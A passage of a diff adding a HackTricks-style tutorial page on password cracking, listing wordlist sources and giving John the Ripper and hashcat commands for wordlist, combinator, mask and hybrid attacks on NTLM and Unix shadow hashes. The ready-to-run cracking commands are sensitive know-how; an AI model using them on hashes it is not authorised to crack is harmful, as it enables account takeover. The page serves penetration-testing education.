+<li><a href="https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists"><strong>Kaonashi</strong></a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords"><strong>Seclists - Passwords</strong></a></li>
+</ul>
+<h3 id="wordlist-generation-tools"><a class="header" href="#wordlist-generation-tools"><strong>Wordlist Generation Tools</strong></a></h3>
+<ul>
+<li><a href="https://github.com/hashcat/kwprocessor"><strong>kwprocessor</strong></a><strong>:</strong> Advanced keyboard-walk generator with configurable base chars, keymap and routes.</li>
+</ul>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
+</code></pre>
+<h3 id="john-mutation"><a class="header" href="#john-mutation">John mutation</a></h3>
+<p>Read <em><strong>/etc/john/john.conf</strong></em> and configure it</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">john --wordlist=words.txt --rules --stdout &gt; w_mutated.txt
+john --wordlist=words.txt --rules=all --stdout &gt; w_mutated.txt #Apply all rules
+</code></pre>
+<h3 id="hashcat"><a class="header" href="#hashcat">Hashcat</a></h3>
+<h4 id="hashcat-attacks"><a class="header" href="#hashcat-attacks">Hashcat attacks</a></h4>
+<ul>
+<li><strong>Wordlist attack</strong> (<code>-a 0</code>) with rules</li>
+</ul>
+<p><strong>Hashcat</strong> already comes with a <strong>folder containing rules</strong> but you can find <a href="https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules"><strong>other interesting rules here</strong></a>.</p>
+<pre><code>hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
+</code></pre>
+<ul>
+<li><strong>Wordlist combinator</strong> attack</li>
+</ul>
+<p>It's possible to <strong>combine 2 wordlists into 1</strong> with hashcat.<br />
+If list 1 contained the word <strong>"hello"</strong> and the second contained 2 lines with the words <strong>"world"</strong> and <strong>"earth"</strong>. The words <code>helloworld</code> and <code>helloearth</code> will be generated.</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"># This will combine 2 wordlists
+hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
+
+# Same attack as before but adding chars in the newly generated words
+# In the previous example this will generate:
+## hello-world!
+## hello-earth!
+hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
+</code></pre>
+<ul>
+<li><strong>Mask attack</strong> (<code>-a 3</code>)</li>
+</ul>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"># Mask attack with simple mask
+hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
+
+hashcat --help #will show the charsets and are as follows
+? | Charset
+===+=========
+l | abcdefghijklmnopqrstuvwxyz
+u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
+d | 0123456789
+h | 0123456789abcdef
+H | 0123456789ABCDEF
+s | !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
+a | ?l?u?d?s
+b | 0x00 - 0xff
+
+# Mask attack declaring custom charset
+hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
+## -1 ?d?s defines a custom charset (digits and specials).
+## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.
+
+# Mask attack with variable password length
+## Create a file called masks.hcmask with this content:
+?d?s,?u?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?l?l?1
+## Use it to crack the password
+hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
+</code></pre>
+<ul>
+<li>Wordlist + Mask (<code>-a 6</code>) / Mask + Wordlist (<code>-a 7</code>) attack</li>
+</ul>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"># Mask numbers will be appended to each word in the wordlist
+hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
+
+# Mask numbers will be prepended to each word in the wordlist
+hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
+</code></pre>
+<h4 id="hashcat-modes"><a class="header" href="#hashcat-modes">Hashcat modes</a></h4>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hashcat --example-hashes | grep -B1 -A2 "NTLM"
+</code></pre>
+<p>Cracking Linux Hashes - /etc/shadow file</p>
+<pre><code> 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
+3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
+7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
+1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
+</code></pre>
+<p>Cracking Windows Hashes</p>
+<pre><code>3000 | LM                                               | Operating-Systems
+1000 | NTLM                                             | Operating-Systems
+</code></pre>
+<p>Cracking Common Application Hashes</p>
+<pre><code>  900 | MD4                                              | Raw Hash
+    0 | MD5                                              | Raw Hash
+ 5100 | Half MD5                                         | Raw Hash
+  100 | SHA1                                             | Raw Hash
+10800 | SHA-384                                          | Raw Hash
+ 1400 | SHA-256                                          | Raw Hash
+ 1700 | SHA-512                                          | Raw Hash
+</code></pre>
+<div class="mdbook-alerts mdbook-alerts-tip">
+<p class="mdbook-alerts-title">
+  <span class="mdbook-alerts-icon"></span>
+  tip
+</p>
+<p>Learn &amp; practice AWS Hacking:<img src="../../../../../images/arte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../../../../images/arte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"><br />
+Learn &amp; practice GCP Hacking: <img src="../../../../../images/grte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong></a><img src="../../../../../images/grte.png" alt="" style="width:auto;height:24px;vertical-align:middle;"></p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+</div>
+
+                        </main>
+
+                        <nav class="nav-wrapper" aria-label="Page navigation">
+                            <!-- Mobile navigation buttons -->
+                                <a rel="prev" href="../generic-methodologies-and-resources/threat-modeling.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                    <i class="fa fa-angle-left"></i>
+                                </a>
+
+                                <a rel="next prefetch" href="../generic-hacking/exfiltration.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                    <i class="fa fa-angle-right"></i>
+                                </a>
+
+                            <div style="clear: both"></div>
+                        </nav>
+
+                        <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                                <a rel="prev" href="../generic-methodologies-and-resources/threat-modeling.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                    <i class="fa fa-angle-left"></i><span style="font-size: medium; align-self: center; margin-left: 10px;">Threat Modeling</span>
+                                </a>
+
+                                <a rel="next prefetch" href="../generic-hacking/exfiltration.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                    <span style="font-size: medium; align-self: center; margin-right: 10px;">Exfiltration</span><i class="fa fa-angle-right"></i>
+                                </a>
+                        </nav>
+                    </div>
+
+                    <div class="sidetoc">
+                        <div class="sidetoc-wrapper">
+                            <nav class="pagetoc"></nav>
+                            <a class="sidesponsor" href="" target="_blank">
+                                <img src="" alt="" srcset="">
+                                <div class="sponsor-title">
+                                </div>
+                                <div class="sponsor-description">
+                                </div>
+                                <div class="sponsor-cta"></div>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer">
+                    <div id="theme-wrapper" class="theme-wrapper">
+                        <div id="theme-btns" class="theme-btns">
+                            <button id="hacktricks-light" type="button" role="radio" aria-label="Switch to light theme" aria-checked="false" class="theme">
+                                <i class="fa fa-sun-o"></i>
+                            </button>
+                            <button id="hacktricks-dark" type="button" role="radio" aria-label="Switch to dark theme" aria-checked="false" class="theme theme-selected">
+                                <i class="fa fa-moon-o"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr.min.js"></script>
+        <script src="../mark.min.js"></script>
+        <!--<script src="../searcher.js"></script>-->
+
+        <script src="../clipboard.min.js"></script>
+        <script src="../highlight.js"></script>
+        <script src="../book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="../theme/pagetoc.js"></script>
+        <script src="../theme/tabs.js"></script>
+        <script src="../theme/ht_searcher.js"></script>
+        <script src="../theme/sponsor.js"></script>
+
+        <!-- Custom analytics -->
+        <script defer src="https://www.fairanalytics.de/pixel/deXeO7BNBrMuhdG1"></script>
+
+
+
+    </div>
+    </body>
+</html>
